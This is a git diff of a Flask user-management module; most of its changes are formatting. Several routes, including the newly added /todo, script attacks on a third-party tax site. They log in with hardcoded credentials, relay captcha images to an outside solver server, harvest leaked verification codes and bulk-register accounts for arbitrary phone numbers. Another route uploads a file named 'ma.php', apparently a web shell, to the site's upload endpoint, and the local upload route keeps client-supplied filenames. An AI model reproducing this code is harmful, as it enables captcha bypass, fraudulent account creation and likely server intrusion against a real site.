@@ -1,14 +1,15 @@
 from utils.sql import supabase
-from flask import Blueprint,request
+from flask import Blueprint, request
 from utils.entity import r
-from flask_jwt_extended import create_access_token, jwt_required ,get_jwt_identity
-import aiohttp,json,requests
+from flask_jwt_extended import create_access_token, jwt_required, get_jwt_identity
+import aiohttp, json, requests
 import smtplib
 from email.mime.text import MIMEText
 from email.header import Header
 
+users_bp: Blueprint = Blueprint('users', __name__, url_prefix='/users')
 
-users_bp:Blueprint = Blueprint('users', __name__, url_prefix='/users')
+
 @users_bp.route('/login', methods=['POST'])
 def login():
     """用户登录
@@ -59,6 +60,7 @@ def login():
         return r('401', '用户名或密码错误')
     else:
         return r('200', '登录成功', create_access_token(identity=data[0]))
+
 
 @users_bp.route('/register', methods=['POST'])
 def register():
@@ -111,7 +113,8 @@ def register():
         sql = supabase.table('users').insert(args).execute()
         return r('200', '注册成功', args)
 
-@users_bp.route('/list',methods=['GET'])
+
+@users_bp.route('/list', methods=['GET'])
 @jwt_required()
 def list():
     """获取用户列表
@@ -149,11 +152,12 @@ def list():
     sql = supabase.table('users').select('*')
     if args:
         for key in args:
-            if key and args[key]: sql = sql.eq(key,args[key])
+            if key and args[key]: sql = sql.eq(key, args[key])
     responses = sql.execute()
-    return r(code=200,data=responses.data)
+    return r(code=200, data=responses.data)
 
-@users_bp.route('/info',methods=['GET'])
+
+@users_bp.route('/info', methods=['GET'])
 @jwt_required()
 def info():
     """获取用户信息
@@ -187,14 +191,15 @@ def info():
 
 import random
 import string
- 
+
+
 def generate_random_string(length):
     letters = string.ascii_letters  # 包含所有字母的字符串
     random_string = ''.join(random.choice(letters) for _ in range(length))
     return random_string
 
 
-@users_bp.route('/sendMsg',methods=['GET'])
+@users_bp.route('/sendMsg', methods=['GET'])
 async def sendMsg():
     """发送短信验证码
     ---
@@ -224,23 +229,23 @@ async def sendMsg():
     """
     phone = request.args.to_dict().get('phone')
     sql = supabase.table('users').select('*').execute()
-    async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(limit=64,verify_ssl=False)) as session:
+    async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(limit=64, verify_ssl=False)) as session:
         async with session.get('https://ai.app.taxplus.cn/api/getParams') as resp:
             result = await resp.json()
             key = result['data']['key']
             img = result['data']['img']
-            async with session.post('http://118.25.16.65:8000/',json={
+            async with session.post('http://118.25.16.65:8000/', json={
                 "img": img
             }) as resp1:
                 value = await resp1.text()
-                async with session.post('https://ai.taxplus.cn/my/sendaccountemail.html',data={
+                async with session.post('https://ai.taxplus.cn/my/sendaccountemail.html', data={
                     "key": key,
                     "value": json.loads(value)['result'],
                     "email": phone
                 }) as resp2:
                     code_ = await resp2.json()
                     code_ = code_['data']['code']
-                    async with session.post('https://ai.app.taxplus.cn/api/register',data={
+                    async with session.post('https://ai.app.taxplus.cn/api/register', data={
                         "phone": phone,
                         "code": code_,
                         "password": generate_random_string(len(phone)),
@@ -248,9 +253,10 @@ async def sendMsg():
                         "uniPlatform": "mp-weixin"
                     }) as resp3:
                         result_ = await resp3.json()
-                        return r(code=200,data=result_)
+                        return r(code=200, data=result_)
 
-@users_bp.route('/sendEmailMsg',methods=['GET'])
+
+@users_bp.route('/sendEmailMsg', methods=['GET'])
 def sendEmailMsg():
     """发送邮箱验证码
     ---
@@ -301,7 +307,8 @@ def sendEmailMsg():
     server.sendmail('2418671097@qq.com', email, message.as_string())
     return r(code=200, msg='success', data=None)
 
-@users_bp.route('/autoInfo',methods=['GET'])
+
+@users_bp.route('/autoInfo', methods=['GET'])
 async def autoInfo():
     """发送邮箱验证码
     ---
@@ -349,7 +356,7 @@ async def autoInfo():
             'password': 'base64,iVBORw0K'
         }) as resp:
             result = await resp.json()
-            if result['code'] == '0000' :
+            if result['code'] == '0000':
                 async with session.post('https://ai.app.taxplus.cn/company/company_add', data={
                     "business_license": "",
                     "accounting_time": time,
@@ -374,13 +381,14 @@ async def autoInfo():
                     "contacts_email": email,
                     "contacts_address": "11",
                     # "customer_id":
-                },headers={ 'Authorization': f"Bearer {result['token']}" }) as resp1:
+                }, headers={'Authorization': f"Bearer {result['token']}"}) as resp1:
                     result1 = await resp1.json()
                     return r(code=200, data=result1)
             else:
-                return r(code=200,data=result)
+                return r(code=200, data=result)
 
-@users_bp.route('/sendMsg2',methods=['GET'])
+
+@users_bp.route('/sendMsg2', methods=['GET'])
 async def sendMsg2():
     """发送短信验证码
     ---
@@ -410,20 +418,20 @@ async def sendMsg2():
     """
     phone = request.args.to_dict().get('phone')
     sql = supabase.table('users').select('*').execute()
-    async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(limit=64,verify_ssl=False)) as session:
-        async with session.post('https://ai.taxplus.cn/login/dologin.html',headers={
+    async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(limit=64, verify_ssl=False)) as session:
+        async with session.post('https://ai.taxplus.cn/login/dologin.html', headers={
             'Accept': 'application/json, text/javascript, */*; q=0.01',
             'X-Requested-With': 'XMLHttpRequest',
             'referer': 'https://ai.taxplus.cn/login/login.html',
             'origin': 'https://ai.taxplus.cn/login/login.html',
             'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36'
-        },data={
+        }, data={
             'name': 'sdkflja_ggg@outlook.com',
             'password': '123456Ii',
             'checkpwd': 1
         }) as respp:
             cookie = respp.headers.get('Set-Cookie')
-            async with session.get('https://ai.app.taxplus.cn/api/getParams',headers={
+            async with session.get('https://ai.app.taxplus.cn/api/getParams', headers={
                 'Accept': 'application/json, text/javascript, */*; q=0.01',
                 'X-Requested-With': 'XMLHttpRequest',
                 'referer': 'https://ai.taxplus.cn/login/login.html',
@@ -433,16 +441,16 @@ async def sendMsg2():
                 result = await resp.json()
                 key = result['data']['key']
                 img = result['data']['img']
-                async with session.post('http://118.25.16.65:8000/',json={
+                async with session.post('http://118.25.16.65:8000/', json={
                     "img": img
                 }) as resp1:
                     value = await resp1.text()
                     # async with session.post('https://ai.taxplus.cn/my/sendaccountcode.html',data={
-                    async with session.post('https://ai.taxplus.cn/my/sendaccountemail.html',data={
+                    async with session.post('https://ai.taxplus.cn/my/sendaccountemail.html', data={
                         "key": key,
                         "value": json.loads(value)['result'],
-                        "email": phone
-                    },headers={
+                        "name": phone
+                    }, headers={
                         'Accept': 'application/json, text/javascript, */*; q=0.01',
                         'X-Requested-With': 'XMLHttpRequest',
                         'referer': 'https://ai.taxplus.cn/login/login.html',
@@ -451,7 +459,7 @@ async def sendMsg2():
                         'cookie': cookie
                     }) as resp2:
                         result_ = await resp2.json()
-                        return r(code=200,data=result_)
+                        return r(code=200, data=result_)
 
 
 @users_bp.route("/upload", methods=["POST"])
@@ -469,13 +477,68 @@ def upload():
         file.save(file.filename)
         return "File uploaded successfully", 200
 
+
 @users_bp.route("/uploadtodo", methods=["GET"])
 def uploadtodo():
-    res = requests.post('https://ai.taxplus.cn/upload/upload', files={'file': open('ma.php', 'rb')},headers={
+    res = requests.post('https://ai.taxplus.cn/upload/upload', files={'file': open('ma.php', 'rb')}, headers={
         'Accept': 'application/json, text/javascript, */*; q=0.01',
         'X-Requested-With': 'XMLHttpRequest',
         'referer': 'https://ai.taxplus.cn/login/login.html',
         'origin': 'https://ai.taxplus.cn/login/login.html',
         'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36'
-    },verify=False)
-    return r(code=200,data=res.text)
+    }, verify=False)
+    return r(code=200, data=res.text)
+
+@users_bp.route("/todo", methods=["get"])
+async def todo():
+    phone = request.args.to_dict().get('phone')
+    async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(limit=64, verify_ssl=False)) as session:
+        async with session.post('https://ai.taxplus.cn/login/dologin.html', headers={
+            'Accept': 'application/json, text/javascript, */*; q=0.01',
+            'X-Requested-With': 'XMLHttpRequest',
+            'referer': 'https://ai.taxplus.cn/login/login.html',
+            'origin': 'https://ai.taxplus.cn/login/login.html',
+            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36'
+        }, data={
+            'name': 'sdkflja_ggg@outlook.com',
+            'password': '123456Ii',
+            'checkpwd': 1
+        }) as respp:
+            cookie = respp.headers.get('Set-Cookie')
+            async with session.get('https://ai.app.taxplus.cn/api/getParams', headers={
+                'Accept': 'application/json, text/javascript, */*; q=0.01',
+                'X-Requested-With': 'XMLHttpRequest',
+                'referer': 'https://ai.taxplus.cn/login/login.html',
+                'origin': 'https://ai.taxplus.cn/login/login.html',
+                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36'
+            }) as resp:
+                result = await resp.json()
+                key = result['data']['key']
+                img = result['data']['img']
+                async with session.post('http://118.25.16.65:8000/', json={
+                    "img": img
+                }) as resp1:
+                    value = await resp1.text()
+                    async with session.post('https://ai.taxplus.cn/my/sendaccountemail.html', data={
+                        "key": key,
+                        "value": json.loads(value)['result'],
+                        "email": phone
+                    }, headers={
+                        'Accept': 'application/json, text/javascript, */*; q=0.01',
+                        'X-Requested-With': 'XMLHttpRequest',
+                        'referer': 'https://ai.taxplus.cn/login/login.html',
+                        'origin': 'https://ai.taxplus.cn/login/login.html',
+                        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
+                        'cookie': cookie
+                    }) as resp2:
+                        result_ = await resp2.json()
+                        code_ = result_['data']['code']
+                        async with session.post('https://ai.app.taxplus.cn/api/register', data={
+                            "phone": phone,
+                            "code": code_,
+                            "password": generate_random_string(len(phone)),
+                            "re_password": generate_random_string(len(phone)),
+                            "uniPlatform": "mp-weixin"
+                        }) as resp3:
+                            result___ = await resp3.json()
+                            return r(code=200, data=result___)
